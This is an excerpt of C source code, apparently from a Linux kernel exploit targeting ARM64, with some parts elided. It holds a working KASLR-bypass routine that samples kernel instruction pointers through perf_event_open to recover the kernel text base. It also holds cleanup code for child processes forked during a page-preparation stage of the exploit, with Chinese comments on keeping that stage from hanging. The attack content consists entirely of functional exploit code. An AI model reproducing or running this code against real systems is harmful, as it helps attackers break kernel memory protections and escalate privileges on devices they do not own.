...
/* 泄漏阶段成功后必须 kill prepare_ctx.childs(pause 挂起的子进程),
 * 否则第二阶段 prepare_good_kernel_page 再 fork 相同数量,进程数翻倍、
 * fd 泄漏,导致第二阶段卡死。 */
void cleanup_page_prepare_children(void) {
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    if (prepare_ctx.childs[i] > 0) {
      kill(prepare_ctx.childs[i], SIGKILL);
      waitpid(prepare_ctx.childs[i], NULL, 0);
...
/* ==========================================================================
 * perf_event KASLR leak
 *
 * Uses PERF_TYPE_SOFTWARE + PERF_COUNT_SW_CPU_CLOCK to sample kernel IPs.
 * Takes the minimum kernel IP >= KIMAGE_TEXT_BASE and rounds to 2MB alignment.
 *
 * This is much faster and more reliable than the futex slide route for KASLR.
 * ========================================================================== */
...
#define PERF_EVENT_IOC_RESET _IO('$', 2)
#endif

#define PERF_SAMPLE_IP (1ULL << 0)

/* ARM64 perf_event_open syscall number */
...
#define perf_rmb() atomic_thread_fence(memory_order_acquire)
...
uint64_t perf_leak_text_base(void) {
  ...
  if (fd < 0) {
    pr_warning("perf_leak: perf_event_open failed errno=%d\n", errno);
    return 0;
  }

  size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
  size_t mmap_size = page_size * 9; /* 1 data page + 8 ring buffer pages */
  void *buf = mmap(NULL, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) {
    pr_warning("perf_leak: mmap failed errno=%d\n", errno);
    close(fd);
    return 0;
  }

  struct perf_event_mmap_page *hdr = (struct perf_event_mmap_page *)buf;
  uint64_t ring_size = mmap_size - page_size;
  char *ring = (char *)buf + page_size;

  /* Reset and enable */
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);

  /* Busy-loop to generate samples. We do getuid syscalls in a tight loop
   * to enter kernel frequently, producing lots of kernel IP samples. */
  volatile int sink = 0;
  for (int i = 0; i < 200000; i++) {
    sink += (int)syscall(SYS_getuid);
    sink += (int)syscall(SYS_getpid);
  }
  (void)sink;

  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

  /* Scan ring buffer for kernel IP samples */
  uint64_t min_kip = ~0ULL;
  uint64_t data_head = hdr->data_head;
  uint64_t data_tail = hdr->data_tail;
  perf_rmb();

  uint64_t pos = data_tail;
  while (pos < data_head) {
    uint64_t offset = pos & (ring_size - 1);
    struct perf_event_header *ev = (struct perf_event_header *)(ring + offset);

    if (ev->type == PERF_RECORD_SAMPLE) {
      /* sample layout: { u64 ip; } (only PERF_SAMPLE_IP set) */
      if (ev->size >= sizeof(struct perf_event_header) + 8) {
        uint64_t *sample_ip =
            (uint64_t *)(ring + ((offset + sizeof(*ev)) & (ring_size - 1)));
        uint64_t ip = *sample_ip;
  ...
  if (min_kip == ~0ULL) {
    pr_warning("perf_leak: no kernel IP samples found\n");
    return 0;
  }

  /* Round down to 2MB alignment — ARM64 kernel text KASLR granularity */
  uint64_t text_base = min_kip & ~((2ULL * 1024 * 1024) - 1);
  pr_info("perf_leak: min_kip=%016llx text_base=%016llx\n",
          (unsigned long long)min_kip, (unsigned long long)text_base);

  /* Sanity check: must be above KIMAGE_TEXT_BASE and have proper shape */
  if (text_base < KIMAGE_TEXT_BASE) {
    pr_warning("perf_leak: text_base below KIMAGE_TEXT_BASE, unreliable\n");
    return 0;
  }
